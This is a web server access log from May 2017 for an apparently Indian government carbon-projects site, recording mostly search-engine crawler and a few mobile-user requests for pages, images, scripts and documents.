157.55.39.130 - - [30/May/2017:05:24:13 +0530] "GET /js/user_registration.js HTTP/1.1" 200 26819 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:05:27:05 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:05:27:05 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:05:27:06 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.133 - - [30/May/2017:05:28:51 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=131 HTTP/1.1" 200 21715 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:05:30:36 +0530] "GET /admin/ HTTP/1.1" 200 6168 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:05:30:52 +0530] "GET /admin/images/loginbg.jpg HTTP/1.1" 200 11936 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.192 - - [30/May/2017:05:30:52 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:56 +0530] "GET /admin/images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:57 +0530] "GET /admin/Scripts/AC_RunActiveContent.js HTTP/1.1" 404 234 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:57 +0530] "GET /admin/images/gtz.jpg HTTP/1.1" 200 15484 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:58 +0530] "GET /admin/images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:59 +0530] "GET /admin/js/ajax_client.js HTTP/1.1" 200 22793 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:30:59 +0530] "GET /admin/ncdma.css HTTP/1.1" 404 213 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:05:31:00 +0530] "GET /includes/CaptchaSecurityImages.php?width=80&height=30&characters=5 HTTP/1.1" 200 2158 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:05:31:07 +0530] "GET /admin/images/img2.jpg HTTP/1.1" 200 16276 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:05:31:08 +0530] "GET /admin/js/index_validation.js HTTP/1.1" 200 1988 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:31:12 +0530] "GET /admin/images/img1.jpg HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
141.8.142.74 - - [30/May/2017:05:31:49 +0530] "GET /project_details_view_report.php?id=946 HTTP/1.1" 200 13163 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.142.74 - - [30/May/2017:05:31:53 +0530] "GET /project_details_view_report.php?id=953 HTTP/1.1" 200 13177 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
141.8.142.74 - - [30/May/2017:05:32:07 +0530] "GET /reports_list_details.php?id=Meghalaya&reporttype=2 HTTP/1.1" 200 18468 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.65.129 - - [30/May/2017:05:34:07 +0530] "GET /reports_list_details.php?id=fnxntyvmlpku&reporttype=&page=274 HTTP/1.1" 200 22094 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [30/May/2017:05:39:00 +0530] "GET /sitemap.php HTTP/1.1" 200 18469 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:05:39:00 +0530] "GET /reports_list_details.php?id=fnxntyvmlpku&reporttype=&page=3 HTTP/1.1" 200 21552 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [30/May/2017:05:39:36 +0530] "GET /capacity_building.php HTTP/1.1" 200 19186 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
210.232.15.25 - - [30/May/2017:05:41:27 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
40.77.167.52 - - [30/May/2017:05:41:50 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:05:44:00 +0530] "GET /reports_list_details.php?id=Andhra&reporttype=&page=202 HTTP/1.1" 200 22133 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.52 - - [30/May/2017:05:46:40 +0530] "GET /downloads/Existing%20PCN.doc HTTP/1.1" 200 114176 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:48:07 +0530] "GET /detail_news.php?id=18 HTTP/1.1" 302 18713 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:48:08 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:48:09 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:05:54:00 +0530] "GET /reports_list_details.php?id=Himachal%20Pradesh&reporttype=2&page=11 HTTP/1.1" 200 18078 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.130 - - [30/May/2017:05:54:56 +0530] "GET /project_details_view.php?id=2180 HTTP/1.1" 200 14213 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
34.207.98.73 - - [30/May/2017:05:56:00 +0530] "GET /robots.txt HTTP/1.0" 404 208 "-" "ia_archiver"
34.207.98.73 - - [30/May/2017:05:56:01 +0530] "GET /project_details_view.php?id=1491 HTTP/1.0" 200 14355 "-" "ia_archiver"
157.55.39.63 - - [30/May/2017:05:57:11 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:05:57:48 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:05:58:31 +0530] "GET /aboutus.php HTTP/1.1" 200 19597 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.52 - - [30/May/2017:05:58:47 +0530] "GET /project_details_view.php?id=573&oid=4&page=3&reporttype=1 HTTP/1.1" 200 15517 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.133 - - [30/May/2017:05:59:11 +0530] "GET /project_details_view.php?id=1579 HTTP/1.1" 200 14425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
202.46.53.67 - - [30/May/2017:06:01:29 +0530] "GET /project_details_view_report.php?id=821 HTTP/1.1" 200 13180 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
180.76.15.19 - - [30/May/2017:06:02:00 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.130 - - [30/May/2017:06:03:35 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.8 - - [30/May/2017:06:04:13 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.63 - - [30/May/2017:06:05:04 +0530] "GET /detail_events.php?id= HTTP/1.1" 302 16738 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:06:05:05 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:06:05:06 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:07:48 +0530] "GET /detail_news.php?id=20 HTTP/1.1" 302 18266 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:07:49 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:07:50 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.129 - - [30/May/2017:06:09:10 +0530] "GET /project_details_view.php?id=1320 HTTP/1.1" 200 15388 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /project_details_view.php?id=426 HTTP/1.1" 200 14091 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:09 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:10 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:10 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:12:10 +0530] "GET /favicon.ico HTTP/1.1" 200 1189 "http://www.cdmindia.gov.in/project_details_view.php?id=426" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
49.44.49.5 - - [30/May/2017:06:13:28 +0530] "GET /project_details_view.php?id=426 HTTP/1.1" 200 14091 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 6.0.1; SM-J500FN Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
66.249.65.131 - - [30/May/2017:06:14:08 +0530] "GET /reports_list_details.php?id=pnjuzahme&reporttype=&page=98 HTTP/1.1" 200 22016 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.135 - - [30/May/2017:06:14:54 +0530] "GET /future_projects.php HTTP/1.1" 302 26210 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:14:56 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:14:57 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.131 - - [30/May/2017:06:18:04 +0530] "GET /project_details_view_report.php?id=1097 HTTP/1.1" 200 13334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.65.131 - - [30/May/2017:06:18:05 +0530] "GET /project_details_view_report.php?id=1097 HTTP/1.1" 200 13334 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
123.125.71.46 - - [30/May/2017:06:18:05 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
157.55.39.63 - - [30/May/2017:06:19:55 +0530] "GET /imp_links.php HTTP/1.1" 200 17834 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.63 - - [30/May/2017:06:19:57 +0530] "GET /constitution.php HTTP/1.1" 200 23669 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.130 - - [30/May/2017:06:19:59 +0530] "GET /project_details_view.php?id=1234 HTTP/1.1" 200 13856 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.65.8 - - [30/May/2017:06:23:13 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
65.55.210.23 - - [30/May/2017:06:25:18 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.11 - - [30/May/2017:06:25:19 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.247 - - [30/May/2017:06:25:21 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
199.30.24.121 - - [30/May/2017:06:25:23 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
66.249.65.131 - - [30/May/2017:06:28:14 +0530] "GET /project_details_view_report.php?id=498 HTTP/1.1" 200 13181 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.130 - - [30/May/2017:06:29:33 +0530] "GET /project_details_view.php?id=609 HTTP/1.1" 200 15499 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
65.55.210.97 - - [30/May/2017:06:31:54 +0530] "GET /js/md5.js HTTP/1.1" 200 13194 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
66.249.65.131 - - [30/May/2017:06:33:25 +0530] "GET /project_details_view_report.php?id=869 HTTP/1.1" 200 13148 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
211.123.206.74 - - [30/May/2017:06:36:25 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (Windows NT 5.1; rv:6.0.2) Gecko/20100101 Firefox/6.0.2"
66.249.65.131 - - [30/May/2017:06:38:24 +0530] "GET /project_details_view.php?id=1747&oid=1&page=14&reporttype=1 HTTP/1.1" 200 14232 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.167.135 - - [30/May/2017:06:41:22 +0530] "GET /detail_news.php?id=5 HTTP/1.1" 302 19150 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:41:23 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.167.135 - - [30/May/2017:06:41:24 +0530] "GET /index.php HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.247.1.216 - - [30/May/2017:06:45:12 +0530] "GET /project_details_view_report.php?id=133 HTTP/1.1" 200 13129 "http://www.google.co.in/search?ie=ISO-8859-1&q=mahalaxmi+vidyut+power+plant&btnG=Search" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:13 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
47.247.1.216 - - [30/May/2017:06:45:14 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "http://www.cdmindia.gov.in/project_details_view_report.php?id=133" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
40.77.167.52 - - [30/May/2017:06:46:03 +0530] "GET /approved_projects.php?n=1 HTTP/1.1" 200 16642 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
47.247.1.216 - - [30/May/2017:06:47:35 +0530] "GET /project_details_view_report.php?id=133 HTTP/1.1" 200 13129 "http://www.google.co.in/search?ie=ISO-8859-1&q=mahalaxmi+vidyut+power+plant+konal&btnG=Search" "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Lenovo K53a48 Build/MMB29M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/534.30"
202.46.58.138 - - [30/May/2017:06:47:57 +0530] "GET /project_details_view_report.php?id=329 HTTP/1.1" 200 13165 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
157.55.39.130 - - [30/May/2017:06:49:44 +0530] "GET /project_details_view.php?id=63 HTTP/1.1" 200 14616 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
54.197.39.49 - - [30/May/2017:06:51:00 +0530] "GET / HTTP/1.1" 200 19480 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36 http://notifyninja.com/monitoring"
123.125.71.42 - - [30/May/2017:06:51:24 +0530] "GET /downloads/Carbon%20Market%20Roadmap.pdf HTTP/1.1" 200 4344697 "-" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
66.249.65.131 - - [30/May/2017:06:58:44 +0530] "GET /project_details_view.php?id=841&oid=&page=67&reporttype= HTTP/1.1" 200 14509 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
